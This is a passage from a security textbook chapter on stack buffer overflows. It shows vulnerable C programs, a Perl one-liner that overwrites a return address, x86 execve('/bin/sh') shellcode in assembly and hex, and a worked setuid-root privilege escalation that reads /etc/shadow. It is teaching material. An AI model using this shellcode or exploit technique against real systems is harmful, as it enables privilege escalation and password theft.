\\r\\nif the data input is too much, as shown in the second example program of Figure \\r\\n10.5b, then the data extend beyond the end of the buffer and ends up overwriting \\r\\nthe saved frame pointer and return address with garbage values (corresponding \\r\\nto the binary representation of the characters supplied). Then, when the function \\r\\nattempts to transfer control to the return address, it typically jumps to an illegal \\r\\nmemory location, resulting in a Segmentation Fault and the abnormal termination \\r\\nvoid hello(char *tag)\\r\\n{\\r\\n char inp[16];\\r\\n printf(\"Enter value for %s: \", tag);\\r\\n gets(inp);\\r\\n printf(\"Hello your %s is %s\\\\n\", tag, inp);\\r\\n}\\r\\nFigure 10.5 Basic Stack Overflow Example\\r\\n(a) Basic stack overflow C code\\r\\n(b) Basic stack overflow example runs\\r\\n$ cc -g -o buffer2 buffer2.c\\r\\n$ ./buffer2\\r\\nEnter value for name: Bill and Lawrie\\r\\nHello your name is Bill and Lawrie\\r\\nbuffer2 done\\r\\n$ ./buffer2\\r\\nEnter value for name: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\\r\\nSegmentation fault (core dumped)\\r\\n$ perl -e \\'print pack(\"H*\", \"414243444546474851525354555657586162636465666768\\r\\ne8ffffbf948304080a4e4e4e4e0a\");\\' | ./buffer2\\r\\nEnter value for name:\\r\\nHello your Re?pyy]uEA is ABCDEFGHQRSTUVWXabcdefguyu\\r\\nEnter value for Kyyu:\\r\\nHello your Kyyu is NNNN\\r\\nSegmentation fault (core dumped)\\r\\nM10_STAL0611_04_GE_C10.indd 351 10/11/17 3:02 PM\\n\\n\\n352 CHAPTER 10 / BUFFER OVERFLOW\\r\\nof the program, as shown. Just supplying random input like this, leading typically \\r\\nto the program crashing, demonstrates the basic stack overflow attack. And since \\r\\nthe program has crashed, it can no longer supply the function or service for which \\r\\nit was running. At its simplest, then, a stack overflow can result in some form of \\r\\ndenial-of-service attack on a system.\\r\\nOf more interest to the attacker, rather than immediately crashing the program, \\r\\nis to have it transfer control to a location and code of the attacker’s choosing. The \\r\\nsimplest way of doing this is for the input causing the buffer overflow to contain the \\r\\ndesired target address at the point where it will overwrite the saved return address \\r\\nin the stack frame. Then, when the attacked function finishes and executes the return \\r\\ninstruction, instead of returning to the calling function, it will jump to the supplied \\r\\naddress instead and execute instructions from there.\\r\\nWe can illustrate this process using the same example function shown in \\r\\nFigure 10.5a. Specifically, we can show how a buffer overflow can cause it to start \\r\\nre-executing the hello function, rather than returning to the calling main routine. \\r\\nTo do this, we need to find the address at which the hello function will be loaded. \\r\\nRemember from our discussion of process creation, when a program is run, the code \\r\\nand global data from the program file are copied into the process virtual address \\r\\nspace in a standard manner. Hence, the code will always be placed at the same loca\\ufffetion. The easiest way to determine this is to run a debugger on the target program \\r\\nand disassemble the target function. When done with the example program contain\\ufffeing the hello function on the Knoppix system being used, the hello function was \\r\\nFigure 10.6 Basic Stack Overflow Stack Values\\r\\nf0830408\\r\\n . . . .\\r\\n3e850408\\r\\n > . . .\\r\\n . . . .\\r\\n . . . .\\r\\ne8fbffbf\\r\\n . . . .\\r\\n60840408\\r\\n ` . . .\\r\\n30561540\\r\\n 0 V . @\\r\\n1b840408\\r\\n . . . .\\r\\ne8fbffbf\\r\\n . . . .\\r\\n3cfcffbf\\r\\n < . . .\\r\\n34fcffbf\\r\\n 4 . . .\\r\\nbffffbdc\\r\\nbffffbe0\\r\\n. . . . \\r\\n . . . .\\r\\nbffffbd8\\r\\nbffffbd4\\r\\nbffffbd0\\r\\nbffffbcc\\r\\nbffffbc8\\r\\nbffffbc4\\r\\nbffffbc0\\r\\n94830408\\r\\n . . . .\\r\\n00850408\\r\\n . . . .\\r\\n. . . .\\r\\nAfter\\r\\ngets(inp)\\r\\nBefore\\r\\ngets(inp)\\r\\nMemory\\r\\nAddress\\r\\n . . . .\\r\\ne8ffffbf\\r\\n . . . .\\r\\n65666768\\r\\n e f g h\\r\\n61626364\\r\\n a b c d\\r\\n55565758\\r\\n U V W X\\r\\n51525354\\r\\n Q R S T\\r\\n45464748\\r\\n E F G H\\r\\n41424344\\r\\n A B C D\\r\\nreturn addr\\r\\ntag\\r\\nContains\\r\\nvalue of\\r\\nold base ptr\\r\\ninp[12-15]\\r\\ninp[8-11]\\r\\ninp[4-7]\\r\\ninp[0-3]\\r\\nM10_STAL0611_04_GE_C10.indd 352 10/11/17 3:02 PM\\n\\n\\n10.1 / STACK OVERFLOWS 353\\r\\nlocated at address 0x08048394. So, this value must overwrite the return address \\r\\nlocation. At the same time, inspection of the code revealed that the buffer inp was \\r\\nlocated 24 bytes below the current frame pointer. This means 24 bytes of content \\r\\nare needed to fill the buffer up to the saved frame pointer. For the purpose of this \\r\\nexample, the string ABCDEFGHQRSTUVWXabcdefgh was used. Lastly, in order to \\r\\noverwrite the return address, the saved frame pointer must also be overwritten with \\r\\nsome valid memory value (because otherwise any use of it following its restoration \\r\\ninto the current frame register would result in the program crashing). For this dem\\ufffeonstration, a (fairly arbitrary) value of 0xbfffffe8 was chosen as being a suitable \\r\\nnearby location on the stack. One further complexity occurs because the Pentium \\r\\narchitecture uses a little-endian representation of numbers. That means for a 4-byte \\r\\nvalue, such as the addresses we are discussing here, the bytes must be copied into \\r\\nmemory with the lowest byte first, then next lowest, finishing with the highest last. \\r\\nThat means the target address of 0x08048394 must be ordered in the buffer as \\r\\n94 83 04 08. The same must be done for the saved frame pointer address. Because \\r\\nthe aim of this attack is to cause the hello function to be called again, a second line \\r\\nof input is included for it to read on the second run, namely the string NNNN, along \\r\\nwith newline characters at the end of each line.\\r\\nSo, now we have determined the bytes needed to form the buffer overflow \\r\\nattack. One last complexity is that the values needed to form the target addresses do \\r\\nnot all correspond to printable characters. So, some way is needed to generate an \\r\\nappropriate binary sequence to input to the target program. Typically, this will be \\r\\nspecified in hexadecimal, which must then be converted to binary, usually by some \\r\\nlittle program. For the purpose of this demonstration, we use a simple one-line Perl8\\r\\nprogram, whose pack() function can be easily used to convert a hexadecimal string \\r\\ninto its binary equivalent, as can be seen in the third of the example program runs in \\r\\nFigure 10.5b. Combining all the elements listed above results in the hexadecimal \\r\\nstring 414243444546474851525354555657586162636465666768e8fff \\r\\nfbf948304080a4e4e4e4e0a, which is converted to binary and written by the Perl \\r\\nprogram. This output is then piped into the targeted buffer2 program, with the \\r\\nresults as shown in Figure 10.5b. Note that the prompt and display of read values is \\r\\nrepeated twice, showing that the function hello has indeed been reentered. How\\ufffeever, as by now the stack frame is no longer valid, when it attempts to return a second \\r\\ntime it jumps to an illegal memory location, and the program crashes. But it has done \\r\\nwhat the attacker wanted first! There are a couple of other points to note in this \\r\\nexample. Although the supplied tag value was correct in the first prompt, by the time \\r\\nthe response was displayed, it had been corrupted. This was due to the final NULL \\r\\ncharacter used to terminate the input string being written to the memory location \\r\\njust past the return address, where the address of the tag parameter was located. So, \\r\\nsome random memory bytes were used instead of the actual value. When the hello\\r\\nfunction was run the second time, the tag parameter was referenced relative to the \\r\\narbitrary, random, overwritten saved frame pointer value, which is some location in \\r\\nupper memory, hence the garbage string seen.\\r\\n8\\r\\nPerl—the Practical Extraction and Report Language—is a very widely used interpreted scripting lan\\ufffeguage. It is usually installed by default on UNIX, Linux, and derivative systems and is available for most \\r\\nother operating systems.\\r\\nM10_STAL0611_04_GE_C10.indd 353 10/11/17 3:02 PM\\n\\n\\n354 CHAPTER 10 / BUFFER OVERFLOW\\r\\nThe attack process is further illustrated in Figure 10.6, which shows the values \\r\\nof the stack frame, including the local buffer inp before and after the call to gets(). \\r\\nLooking at the stack frame before this call, we see that the buffer inp contains gar\\ufffebage values, being whatever was in memory before. The saved frame pointer value \\r\\nis 0xbffffbe8, and the return address is 0x080483f0. After the gets() call, the \\r\\nbuffer inp contained the string of letters specified above, the saved frame pointer \\r\\nbecame 0xbfffffe8, and the return address was 0x08048394, exactly as we speci\\ufffefied in our attack string. Note also how the bottom byte of the tag parameter was \\r\\ncorrupted, by being changed to 0x00, the trailing NULL character mentioned previ\\ufffeously. Clearly, the attack worked as designed.\\r\\nHaving seen how the basic stack overflow attack works, consider how it could \\r\\nbe made more sophisticated. Clearly, the attacker can overwrite the return address \\r\\nwith any desired value, not just the address of the targeted function. It could be the \\r\\naddress of any function, or indeed of any sequence of machine instructions present \\r\\nin the program or its associated system libraries. We will explore this variant in a \\r\\nlater section. However, the approach used in the original attacks was to include the \\r\\ndesired machine code in the buffer being overflowed. That is, instead of the sequence \\r\\nof letters used as padding in the example above, binary values corresponding to the \\r\\ndesired machine instructions were used. This code is known as shellcode, and we will \\r\\ndiscuss its creation in more detail shortly. In this case, the return address used in the \\r\\nattack is the starting address of this shellcode, which is a location in the middle of the \\r\\ntargeted function’s stack frame. So, when the attacked function returns, the result is \\r\\nto execute machine code of the attacker’s choosing.\\r\\nMORE STACK OVERFLOW VULNERABILITIES Before looking at the design of shell\\ufffecode, there are a few more things to note about the structure of the functions targeted \\r\\nwith a buffer overflow attack. In all the examples used so far, the buffer overflow has \\r\\noccurred when the input was read. This was the approach taken in early buffer over\\ufffeflow attacks, such as in the Morris Worm. However, the potential for a buffer overflow \\r\\nexists anywhere that data is copied or merged into a buffer, where at least some of \\r\\nthe data are read from outside the program. If the program does not check to ensure \\r\\nthe buffer is large enough, or the data copied are correctly terminated, then a buffer \\r\\noverflow can occur. The possibility also exists that a program can safely read and \\r\\nsave input, pass it around the program, then at some later time in another function \\r\\nunsafely copy it, resulting in a buffer overflow. Figure 10.7a shows an example pro\\ufffegram illustrating this behavior. The main() function includes the buffer buf. This is \\r\\npassed along with its size to the function getinp(), which safely reads a value using \\r\\nthe fgets() library routine. This routine guarantees to read no more characters than \\r\\none less than the buffers size, allowing room for the trailing NULL. The getinp()\\r\\nfunction then returns to main(), which then calls the function display() with \\r\\nthe value in buf. This function constructs a response string in a second local buffer \\r\\ncalled tmp and then displays this. Unfortunately, the sprintf() library routine is \\r\\nanother common, unsafe C library routine that fails to check that it does not write \\r\\ntoo much data into the destination buffer. Note in this program that the buffers are \\r\\nboth the same size. This is a quite common practice in C programs, although they are \\r\\nusually rather larger than those used in these example programs. Indeed, the standard \\r\\nC IO library has a defined constant BUFSIZ, which is the default size of the input \\r\\nM10_STAL0611_04_GE_C10.indd 354 10/11/17 3:02 PM\\n\\n\\n10.1 / STACK OVERFLOWS 355\\r\\nvoid gctinp(ohar *inp, int siz)\\r\\n{\\r\\n puts(\"Input value: \");\\r\\n fgets(inp, siz, stdin);\\r\\n printf(\"buffer3 getinp read %s\\\\n\", inp);\\r\\n}\\r\\nvoid display(char *val)\\r\\n{\\r\\n char tmp[16];\\r\\n sprintf(tmp, \"read val: %s\\\\n\", val);\\r\\n puts(tmp);\\r\\n}\\r\\nint main(int argc, char *argv[])\\r\\n{\\r\\n char buf[16];\\r\\n getinp (buf, sizeof (buf));\\r\\n display(buf);\\r\\n printf(\"buffer3 done\\\\n\");\\r\\n}\\r\\nFigure 10.7 Another Stack Overflow Example\\r\\n(a) Another stack overflow C code\\r\\n(b) Another stack overflow example runs\\r\\n$ cc -o buffer3 buffer3.c\\r\\n$ ./buffer3\\r\\nInput value:\\r\\nSAFE\\r\\nbuffer3 getinp read SAFE\\r\\nread val: SAFE\\r\\nbuffer3 done\\r\\n$ ./buffer3\\r\\nInput value:\\r\\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\\r\\nbuffer3 getinp read XXXXXXXXXXXXXXX\\r\\nread val: XXXXXXXXXXXXXXX\\r\\nbuffer3 done\\r\\nSegmentation fault (core dumped)\\r\\nbuffers it uses. This same constant is often used in C programs as the standard size of \\r\\nan input buffer. The problem that may result, as it does in this example, occurs when \\r\\ndata are being merged into a buffer that includes the contents of another buffer, such \\r\\nthat the space needed exceeds the space available. Look at the example runs of this \\r\\nprogram shown in Figure 10.7b. For the first run, the value read is small enough that \\r\\nM10_STAL0611_04_GE_C10.indd 355 10/11/17 3:02 PM\\n\\n\\n356 CHAPTER 10 / BUFFER OVERFLOW\\r\\ngets(char *str) read line from standard input into str\\r\\nsprintf(char *str, char *format, ...) create str according to supplied format and variables\\r\\nstrcat(char *dest, char *src) append contents of string src to string dest\\r\\nstrcpy(char *dest, char *src) copy contents of string src to string dest\\r\\nvsprintf(char *str, char *fmt, va_list ap) create str according to supplied format and variables\\r\\nTable 10.2 Some Common Unsafe C Standard Library Routines\\r\\nthe merged response did not corrupt the stack frame. For the second run, the supplied \\r\\ninput was much too large. However, because a safe input function was used, only \\r\\n15 characters were read, as shown in the following line. When this was then merged \\r\\nwith the response string, the result was larger than the space available in the destina\\ufffetion buffer. In fact, it overwrote the saved frame pointer, but not the return address. \\r\\nSo the function returned, as shown by the message printed by the main() function. \\r\\nBut when main() tried to return, because its stack frame had been corrupted and \\r\\nwas now some random value, the program jumped to an illegal address and crashed. \\r\\nIn this case, the combined result was not long enough to reach the return address, but \\r\\nthis would be possible if a larger buffer size had been used.\\r\\nThis shows that when looking for buffer overflows, all possible places where \\r\\nexternally sourced data are copied or merged have to be located. Note these do not \\r\\neven have to be in the code for a particular program, they can (and indeed do) occur \\r\\nin library routines used by programs, including both standard libraries and third-party \\r\\napplication libraries. Thus, for both attacker and defender, the scope of possible buffer \\r\\noverflow locations is very large. A list of some of the most common unsafe standard \\r\\nC Library routines is given in Table 10.2.9\\r\\n These routines are all suspect and should \\r\\nnot be used without checking the total size of data being transferred in advance, or \\r\\nbetter still by being replaced with safer alternatives.\\r\\nOne further note before we focus on details of the shellcode. As a consequence \\r\\nof the various stack-based buffer overflows illustrated here, significant changes have \\r\\nbeen made to the memory near the top of the stack. Specifically, the return address \\r\\nand pointer to the previous stack frame have usually been destroyed. This means that \\r\\nafter the attacker’s code has run, there is no easy way to restore the program state \\r\\nand continue execution. This is not normally of concern for the attacker, because the \\r\\nattacker’s usual action is to replace the existing program code with a command shell. \\r\\nBut even if the attacker does not do this, continued normal execution of the attacked \\r\\nprogram is very unlikely. Any attempt to do so will most likely result in the program \\r\\ncrashing. This means that a successful buffer overflow attack results in the loss of the \\r\\nfunction or service the attacked program provided. How significant or noticeable \\r\\nthis is will depend very much on the attacked program and the environment it is run \\r\\nin. If it was a client process or thread, servicing an individual request, the result may \\r\\nbe minimal aside from perhaps some error messages in the log. However, if it was \\r\\nan important server, its loss may well produce a noticeable effect on the system of \\r\\n9\\r\\nThere are other unsafe routines that may be commonly used, including a number that are OS specific. \\r\\nMicrosoft maintains a list of unsafe Windows library calls; the list should be consulted while programming \\r\\nfor Windows systems [HOWA07].\\r\\nM10_STAL0611_04_GE_C10.indd 356 10/11/17 3:02 PM\\n\\n\\n10.1 / STACK OVERFLOWS 357\\r\\nwhich the users and administrators may become aware, hinting that there is indeed \\r\\na problem with their system.\\r\\nShellcode\\r\\nAn essential component of many buffer overflow attacks is the transfer of execution \\r\\nto code supplied by the attacker and often saved in the buffer being overflowed. This \\r\\ncode is known as shellcode, because traditionally its function was to transfer control \\r\\nto a user command-line interpreter, or shell, which gave access to any program avail\\ufffeable on the system with the privileges of the attacked program. On UNIX systems this \\r\\nwas often achieved by compiling the code for a call to the execve (”/bin/sh”)\\r\\nsystem function, which replaces the current program code with that of the Bourne \\r\\nshell (or whichever other shell the attacker preferred). On Windows systems, it typi\\ufffecally involved a call to the system(”command.exe”) function (or ”cmd.exe”\\r\\non older systems) to run the DOS Command shell. Shellcode then is simply machine \\r\\ncode, a series of binary values corresponding to the machine instructions and data \\r\\nvalues that implement the attacker’s desired functionality. This means shellcode is \\r\\nspecific to a particular processor architecture, and indeed usually to a specific operat\\ufffeing system, as it needs to be able to run on the targeted system and interact with its \\r\\nsystem functions. This is the major reason why buffer overflow attacks are usually tar\\ufffegeted at a specific piece of software running on a specific operating system. Because \\r\\nshellcode is machine code, writing it traditionally required a good understanding of \\r\\nthe assembly language and operation of the targeted system. Indeed, many of the \\r\\nclassic guides to writing shellcode, including the original [LEVY96], assumed such \\r\\nknowledge. However, more recently a number of sites and tools have been developed \\r\\nthat automate this process (as indeed has occurred in the development of security \\r\\nexploits generally), thus making the development of shellcode exploits available to a \\r\\nmuch larger potential audience. One site of interest is the Metasploit Project, which \\r\\naims to provide useful information to people who perform penetration testing, IDS \\r\\nsignature development, and exploit research. It includes an advanced open-source \\r\\nplatform for developing, testing, and using exploit code, which can be used to create \\r\\nshellcode that performs any one of a variety of tasks and that exploits a range of \\r\\nknown buffer overflow vulnerabilities.\\r\\nSHELLCODE DEVELOPMENT To highlight the basic structure of shellcode, we explore \\r\\nthe development of a simple classic shellcode attack, which simply launches the \\r\\nBourne shell on an Intel Linux system. The shellcode needs to implement the func\\ufffetionality shown in Figure 10.8a. The shellcode marshals the necessary arguments \\r\\nfor the execve() system function, including suitable minimal argument and envi\\uffferonment lists, and then calls the function. To generate the shellcode, this high-level \\r\\nlanguage specification must first be compiled into equivalent machine language. \\r\\nHowever, a number of changes must then be made. First, execve(sh,args,NULL)\\r\\nis a library function that in turn marshals the supplied arguments into the correct \\r\\nlocations (machine registers in the case of Linux) then triggers a software interrupt \\r\\nto invoke the kernel to perform the desired system call. For use in shellcode, these \\r\\ninstructions are included inline, rather than relying on the library function.\\r\\nThere are also several generic restrictions on the content of shellcode. First, it \\r\\nhas to be position independent. That means it cannot contain any absolute address \\r\\nM10_STAL0611_04_GE_C10.indd 357 10/11/17 3:02 PM\\r\\nhttps://sanet.st/blogs/polatebooks\\n\\n\\n358 CHAPTER 10 / BUFFER OVERFLOW\\r\\nint main (int argc, char *argv[])\\r\\n{\\r\\n char *sh;\\r\\n char *args[2];\\r\\n sh = \"/bin/sh\";\\r\\n args[0] = sh;\\r\\n args[1] = NULL;\\r\\n execve (sh, args, NULL);\\r\\n}\\r\\nFigure 10.8 Example UNIX Shellcode\\r\\n(a) Desired shellcode code in C\\r\\n(b) Equivalent position-independent x86 assembly code\\r\\n(c) Hexadecimal values for compiled x86 machine code\\r\\nnop\\r\\nnop //end of nop sled\\r\\n jmp find //jump to end of code\\r\\ncont: pop %esi //pop address of sh off stack into %esi\\r\\n xor %eax, %eax //zero contents of EAX\\r\\n mov %al, 0x7(%esi) //copy zero byte to end of string sh (%esi)\\r\\n lea (%esi), %ebx //load address of sh (%esi) into %ebx\\r\\n mov %ebx,0x8(%esi) //save address of sh in args [0] (%esi+8)\\r\\n mov %eax,0xc(%esi) //copy zero to args[1] (%esi+c)\\r\\n mov $0xb,%al //copy execve syscall number (11) to AL\\r\\n mov %esi,%ebx //copy address of sh (%esi) into %ebx\\r\\n lea 0x8(%esi),%ecx //copy address of args (%esi+8) to %ecx\\r\\n lea 0xc(%esi),%edx //copy address of args[1] (%esi+c) to %edx\\r\\n int $0x80 //software interrupt to execute syscall\\r\\nfind: call cont //call cont which saves next address on stack\\r\\nsh: .string \"/bin/sh\" //string constant\\r\\nargs: .long 0 //space used for args array\\r\\n .long 0 //args[1] and also NULL for env array\\r\\n90 90 eb 1a 5e 31 c0 88 46 07 8d 1e 89 5e 08 89\\r\\n46 0c b0 0b 89 f3 8d 4e 08 8d 56 0c cd 80 e8 e1\\r\\nff ff ff 2f 62 69 6e 2f 73 68 20 20 20 20 20 20\\r\\nreferring to itself, because the attacker generally cannot determine in advance exactly \\r\\nwhere the targeted buffer will be located in the stack frame of the function in which \\r\\nit is defined. These stack frames are created one below the other, working down from \\r\\nthe top of the stack as the flow of execution in the target program has functions call\\ufffeing other functions. The number of frames and hence final location of the buffer will \\r\\ndepend on the precise sequence of function calls leading to the targeted function. \\r\\nThis function might be called from several different places in the program, and there \\r\\nM10_STAL0611_04_GE_C10.indd 358 10/11/17 3:02 PM\\n\\n\\n10.1 / STACK OVERFLOWS 359\\r\\nmight be different sequences of function calls, or different amounts of temporary \\r\\nlocal values using the stack before it is finally called. So while the attacker may have \\r\\nan approximate idea of the location of the stack frame, it usually cannot be deter\\ufffemined precisely. All of this means that the shellcode must be able to run no matter \\r\\nwhere in memory it is located. This means only relative address references, offsets to \\r\\nthe current instruction address, can be used. It also means the attacker is not able to \\r\\nprecisely specify the starting address of the instructions in the shellcode.\\r\\nAnother restriction on shellcode is that it cannot contain any NULL values. \\r\\nThis is a consequence of how it is typically copied into the buffer in the first place. All \\r\\nthe examples of buffer overflows we use in this chapter involve using unsafe string \\r\\nmanipulation routines. In C, a string is always terminated with a NULL character, \\r\\nwhich means the only place the shellcode can have a NULL is at the end, after all the \\r\\ncode, overwritten old frame pointer, and return address values.\\r\\nGiven the above limitations, what results from this design process is code simi\\ufffelar to that shown in Figure 10.8b. This code is written in x86 assembly language,10\\r\\nas used by Pentium processors. To assist in reading this code, Table 10.3 provides a \\r\\nlist of common x86 assembly language instructions, and Table 10.4 lists some of the \\r\\ncommon machine registers it references.11 A lot more detail on x86 assembly lan\\ufffeguage and machine organization may be found in [STAL16b]. In general, the code \\r\\nin Figure 10.8b implements the functionality specified in the original C program in \\r\\nFigure 10.8a. However, in order to overcome the limitations mentioned above, there \\r\\nare a few unique features.\\r\\n10There are two conventions for writing x86 assembly language: Intel and AT&T. Among other differences, \\r\\nthey use opposing orders for the operands. All of the examples in this chapter use the AT&T convention, \\r\\nbecause that is what the GNU GCC compiler tools used to create these examples, accept and generate.\\r\\n11These machine registers are all now 32 bits long. However, some can also be used as a 16-bit register \\r\\n(being the lower half of the register) or 8-bit registers (relative to the 16-bit version) if needed.\\r\\nMOV src, dest copy (move) value from src into dest\\r\\nLEA src, dest copy the address (load effective address) of src into dest\\r\\nADD / SUB src, dest add / sub value in src from dest leaving result in dest\\r\\nAND / OR / XOR src, dest logical and / or / xor value in src with dest leaving result in dest\\r\\nCMP val1, val2 compare val1 and val2, setting CPU flags as a result\\r\\nJMP / JZ / JNZ addr jump / if zero / if not zero to addr\\r\\nPUSH src push the value in src onto the stack\\r\\nPOP dest pop the value on the top of the stack into dest\\r\\nCALL addr call function at addr\\r\\nLEAVE clean up stack frame before leaving function\\r\\nRET return from function\\r\\nINT num software interrupt to access operating system function\\r\\nNOP no operation or do nothing instruction\\r\\nTable 10.3 Some Common x86 Assembly Language Instructions\\r\\nM10_STAL0611_04_GE_C10.indd 359 10/11/17 3:02 PM\\n\\n\\n360 CHAPTER 10 / BUFFER OVERFLOW\\r\\n32 bit 16 bit\\r\\n8 bit \\r\\n(high)\\r\\n8 bit \\r\\n(low) Use\\r\\n%eax %ax %ah %al Accumulators used for arithmetical and I/O operations and execute \\r\\ninterrupt calls\\r\\n%ebx %bx %bh %bl Base registers used to access memory, pass system call arguments \\r\\nand return values\\r\\n%ecx %cx %ch %cl Counter registers\\r\\n%edx %dx %dh %dl Data registers used for arithmetic operations, interrupt calls and IO \\r\\noperations\\r\\n%ebp Base Pointer containing the address of the current stack frame\\r\\n%eip Instruction Pointer or Program Counter containing the address of \\r\\nthe next instruction to be executed\\r\\n%esi Source Index register used as a pointer for string or array operations\\r\\n%esp Stack Pointer containing the address of the top of stack\\r\\nTable 10.4 Some x86 Registers\\r\\nThe first feature is how the string ”/bin/sh” is referenced. As compiled by \\r\\ndefault, this would be assumed to part of the program’s global data area. But for use \\r\\nin shellcode, it must be included along with the instructions, typically located just after \\r\\nthem. In order to then refer to this string, the code must determine the address where \\r\\nit is located, relative to the current instruction address. This can be done via a novel, \\r\\nnonstandard use of the CALL instruction. When a CALL instruction is executed, it \\r\\npushes the address of the memory location immediately following it onto the stack. \\r\\nThis is normally used as the return address when the called function returns. In a neat \\r\\ntrick, the shellcode jumps to a CALL instruction at the end of the code just before the \\r\\nconstant data (such as ”/bin/sh”) then calls back to a location just after the jump. \\r\\nInstead of treating the address CALL pushed onto the stack as a return address, it \\r\\npops it off the stack into the %esi register to use as the address of the constant data. \\r\\nThis technique will succeed no matter where in memory the code is located. Space for \\r\\nthe other local variables used by the shellcode is placed following the constant string, \\r\\nand also referenced using offsets from this same dynamically determined address.\\r\\nThe next issue is ensuring that no NULLs occur in the shellcode. This means \\r\\na zero value cannot be used in any instruction argument or in any constant data \\r\\n(such as the terminating NULL on the end of the ”/bin/sh” string). Instead, any \\r\\nrequired zero values must be generated and saved as the code runs. The logical XOR \\r\\ninstruction of a register value with itself generates a zero value, as is done here with \\r\\nthe %eax register. This value can then be copied anywhere needed, such as the end \\r\\nof the string, and also as the value of args[1].\\r\\nTo deal with the inability to precisely determine the starting address of this \\r\\ncode, the attacker can exploit the fact that the code is often much smaller than the \\r\\nspace available in the buffer (just 40 bytes long in this example). By the placing the \\r\\ncode near the end of the buffer, the attacker can pad the space before it with NOP \\r\\ninstructions. Because these instructions do nothing, the attacker can specify the return \\r\\naddress used to enter this code as a location somewhere in this run of NOPs, which \\r\\nM10_STAL0611_04_GE_C10.indd 360 10/11/17 3:02 PM\\n\\n\\n10.1 / STACK OVERFLOWS 361\\r\\nis called a NOP sled. If the specified address is approximately in the middle of the \\r\\nNOP sled, the attacker’s guess can differ from the actual buffer address by half the \\r\\nsize of the NOP sled, and the attack will still succeed. No matter where in the NOP \\r\\nsled the actual target address is, the computer will run through the remaining NOPs, \\r\\ndoing nothing, until it reaches the start of the real shellcode.\\r\\nWith this background, you should now be able to trace through the resulting \\r\\nassembler shellcode listed in Figure 10.8b. In brief, this code:\\r\\n• Determines the address of the constant string using the JMP/CALL trick.\\r\\n• Zeroes the contents of %eax and copies this value to the end of the constant \\r\\nstring.\\r\\n• Saves the address of that string in args[0].\\r\\n• Zeroes the value of args[1].\\r\\n• Marshals the arguments for the system call being:\\r\\n— The code number for the execve system call (11).\\r\\n— The address of the string as the name of the program to load.\\r\\n— The address of the args array as its argument list.\\r\\n— The address of args[1], because it is NULL, as the (empty) environment list.\\r\\n• Generates a software interrupt to execute this system call (which never returns).\\r\\nWhen this code is assembled, the resulting machine code is shown in hexadecimal in \\r\\nFigure 10.8c. This includes a couple of NOP instructions at the front (which can be \\r\\nmade as long as needed for the NOP sled), and ASCII spaces instead of zero values \\r\\nfor the local variables at the end (because NULLs cannot be used, and because the \\r\\ncode will write the required values in when it runs). This shellcode forms the core of \\r\\nthe attack string, which must now be adapted for some specific vulnerable program.\\r\\nEXAMPLE OF A STACK OVERFLOW ATTACK We now have all of the components \\r\\nneeded to understand a stack overflow attack. To illustrate how such an attack is actu\\ufffeally executed, we use a target program that is a variant on that shown in Figure 10.5a. \\r\\nThe modified program has its buffer size increased to 64 (to provide enough room \\r\\nfor our shellcode), has unbuffered input (so no values are lost when the Bourne shell \\r\\nis launched), and has been made setuid root. This means when it is run, the program \\r\\nexecutes with superuser/administrator privileges, with complete access to the system. \\r\\nThis simulates an attack where an intruder has gained access to some system as a \\r\\nnormal user and wishes to exploit a buffer overflow in a trusted utility to gain greater \\r\\nprivileges.\\r\\nHaving identified a suitable, vulnerable, trusted utility program, the attacker \\r\\nhas to analyze it to determine the likely location of the targeted buffer on the stack \\r\\nand how much data are needed to reach up to and overflow the old frame pointer \\r\\nand return address in its stack frame. To do this, the attacker typically runs the target \\r\\nprogram using a debugger on the same type of system as is being targeted. Either by \\r\\ncrashing the program with too much random input then using the debugger on the \\r\\ncore dump, or by just running the program under debugger control with a breakpoint \\r\\nin the targeted function, the attacker determines a typical location of the stack frame \\r\\nM10_STAL0611_04_GE_C10.indd 361 10/11/17 3:02 PM\\n\\n\\n362 CHAPTER 10 / BUFFER OVERFLOW\\r\\nfor this function. When this was done with our demonstration program, the buffer \\r\\ninp was found to start at address 0xbffffbb0, the current frame pointer (in %ebp) \\r\\nwas 0xbffffc08, and the saved frame pointer at that address was 0xbffffc38. \\r\\nThis means that 0x58 or 88 bytes are needed to fill the buffer and reach the saved \\r\\nframe pointer. Allowing first a few more spaces at the end to provide room for the \\r\\nargs array, the NOP sled at the start is extended until a total of exactly 88 bytes \\r\\nare used. The new frame pointer value can be left as 0xbffffc38, and the target \\r\\nreturn address value can be set to 0xbffffbc0, which places it around the middle \\r\\nof the NOP sled. Next, there must be a newline character to end this (overlong) input \\r\\nline, which gets() will read. This gives a total of 97 bytes. Once again a small Perl \\r\\nprogram is used to convert the hexadecimal representation of this attack string into \\r\\nbinary to implement the attack.\\r\\nThe attacker must also specify the commands to be run by the shell once the \\r\\nattack succeeds. These also must be written to the target program, as the spawned \\r\\nBourne shell will be reading from the same standard input as the program it replaces. \\r\\nIn this example, we will run two UNIX commands:\\r\\n1. whoami displays the identity of the user whose privileges are currently being \\r\\nused.\\r\\n2. cat/etc/shadow displays the contents of the shadow password file, holding \\r\\nthe user’s encrypted passwords, which only the superuser has access to.\\r\\nFigure 10.9 shows this attack being executed. First, a directory listing of the target \\r\\nprogram buffer4 shows that it is indeed owned by the root user and is a setuid pro\\ufffegram. Then when the target commands are run directly, the current user is identified \\r\\nas knoppix, which does not have sufficient privilege to access the shadow password \\r\\nfile. Next, the contents of the attack script are shown. It contains the Perl program \\r\\nfirst to encode and output the shellcode and then output the desired shell com\\ufffemands. Lastly, you see the result of piping this output into the target program. The \\r\\ninput line read displays as garbage characters (truncated in this listing, though note \\r\\nthe string /bin/sh is included in it). Then, the output from the whoami command \\r\\nshows the shell is indeed executing with root privileges. This means the contents \\r\\nof the shadow password file can be read, as shown (also truncated). The encrypted \\r\\npasswords for users root and knoppix may be seen, and these could be given to a \\r\\npassword-cracking program to attempt to determine their values. Our attack has \\r\\nsuccessfully acquired superuser privileges on the target system and could be used to \\r\\nrun any desired command.\\r\\nThis example simulates the exploit of a local vulnerability on a system, enabling \\r\\nthe attacker to escalate his or her privileges. In practice, the buffer is likely to be \\r\\nlarger (1024 being a common size), which means the NOP sled would be correspond\\ufffeingly larger, and consequently the guessed target address need not be as accurately \\r\\ndetermined. In addition, in practice a targeted utility will likely use buffered rather \\r\\nthan unbuffered input. This means that the input library reads ahead by some amount \\r\\nbeyond what the program has requested. However, when the execve(”/bin/sh”)\\r\\nfunction is called, this buffered input is discarded. Thus the attacker needs to pad \\r\\nthe input sent to the program with sufficient lines of blanks (typically about 1000+\\r\\ncharacters worth) so the desired 